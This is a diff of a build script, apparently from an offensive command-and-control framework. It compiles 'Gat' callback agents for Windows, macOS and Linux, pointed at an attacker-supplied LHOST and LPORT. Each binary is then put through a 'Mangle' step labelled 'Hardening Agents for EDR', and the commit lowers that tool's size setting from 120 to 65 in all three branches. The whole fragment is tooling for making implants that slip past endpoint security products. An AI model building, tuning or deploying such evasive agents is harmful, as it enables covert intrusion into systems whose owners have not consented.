@@ -55,7 +55,7 @@ if [ "$1" = "Windows" ] || [ "$1" = "windows" ]; then
   echo "Making Agents"
   make windows64 LHOST=$2 LPORT=$3 > /dev/null 2>&1
   echo "Hardening Agents for EDR"
-  ./Mangle -I $GWD/Gat.exe -M -O $GWD/WindowsGatEDR.exe -S 120 > /dev/null 2>&1
+  ./Mangle -I $GWD/Gat.exe -M -O $GWD/WindowsGatEDR.exe -S 65 > /dev/null 2>&1
   rm -rf $GWD/Gat.exe
   mv ./WindowsGatEDR.exe Agents/
   echo "Gat ready for deployment"
@@ -86,7 +86,7 @@ if [ "$1" = "Mac" ] || [ "$1" = "mac" ]; then
   echo "Making Agents"
   make macos64 LHOST=$2 LPORT=$3 > /dev/null 2>&1
   echo "Hardening Agents for EDR"
-  ./Mangle -I $GWD/Gat -M -O $GWD/DarwinGatEDR -S 120 > /dev/null 2>&1
+  ./Mangle -I $GWD/Gat -M -O $GWD/DarwinGatEDR -S 65 > /dev/null 2>&1
   rm -rf $GWD/Gat
   mv DarwinGatEDR Agents/
   echo "Gat ready for deployment"
@@ -118,7 +118,7 @@ if [ "$1" = "Linux" ] || [ "$1" = "linux" ]; then
   echo "Making Agents"
   make linux64 LHOST=$2 LPORT=$3 > /dev/null 2>&1
   echo "Hardening Agents for EDR"
-  ./Mangle -I $GWD/Gat -M -O $GWD/LinuxGatEDR -S 120 > /dev/null 2>&1
+  ./Mangle -I $GWD/Gat -M -O $GWD/LinuxGatEDR -S 65 > /dev/null 2>&1
   rm -rf $GWD/Gat
   mv LinuxGatEDR Agents/
   echo "Gat ready for deployment"
